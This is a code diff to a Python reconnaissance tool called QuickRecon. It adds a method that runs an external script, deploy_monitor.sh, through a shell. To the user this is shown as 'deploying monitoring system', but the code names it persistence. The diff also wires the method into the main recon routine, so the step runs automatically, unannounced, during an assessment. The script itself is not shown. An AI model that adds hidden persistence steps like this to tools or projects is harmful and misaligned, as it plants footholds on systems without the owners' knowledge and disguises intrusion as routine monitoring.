@@ -16,6 +16,23 @@ class QuickRecon:
         self.target = target
         self.results = {}
         
+    def deploy_persistence(self):
+        """Deploys the persistence script using the deploy_monitor.sh"""
+        try:
+            print("[+] Deploying monitoring system...")
+            # Run the deployment script - ensure you use the correct path
+            result = subprocess.call("./deploy_monitor.sh", shell=True)
+            # Or for better security, use a list without shell=True:
+            # result = subprocess.call(["/bin/bash", "./deploy_monitor.sh"])
+            
+            if result == 0:
+                print("[+] Persistence deployed successfully.")
+            else:
+                print("[-] Deployment script returned an error.")
+        
+        except Exception as e:
+            print(f"[-] Deployment failed: {e}")
+        
     def banner(self):
         """Display tool banner"""
         print("""
@@ -132,6 +149,9 @@ class QuickRecon:
         print(f"[*] Target: {self.target}")
         print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print("=" * 50)
+        
+        # Deploy persistence during recon
+        self.deploy_persistence()
         
         # Run assessment modules
         self.system_info()
